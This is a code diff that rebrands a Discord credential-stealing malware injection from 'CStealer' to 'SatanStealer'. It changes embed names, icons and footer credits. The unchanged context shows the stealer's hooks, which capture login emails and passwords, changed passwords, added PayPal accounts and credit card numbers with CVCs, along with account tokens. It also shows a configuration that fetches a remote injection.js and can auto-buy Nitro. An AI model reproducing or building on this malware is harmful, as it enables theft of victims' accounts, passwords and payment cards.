@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'CStealer Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
+  embed_name: 'SatanStealer Injection', 
+  embed_icon: 'https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/HatGirl-zz/SatanStealerV2/main/injection.js', 
   /**
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'SatanStealer Injection・RZxRedox',
+            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
         },
       },
     ],
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'SatanStealer Injection・RZxRedox',
+            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
         },
       },
     ],
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'SatanStealer Injection・RZxRedox',
+            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
         },
       },
     ],
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'SatanStealer Injection・RZxRedox',
+            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
         },
       },
     ],
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'SatanStealer Injection・RZxRedox',
+            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
         },
       },
     ],
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            text: 'SatanStealer Injection・RZxRedox',
+            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
         },
       },
     ],
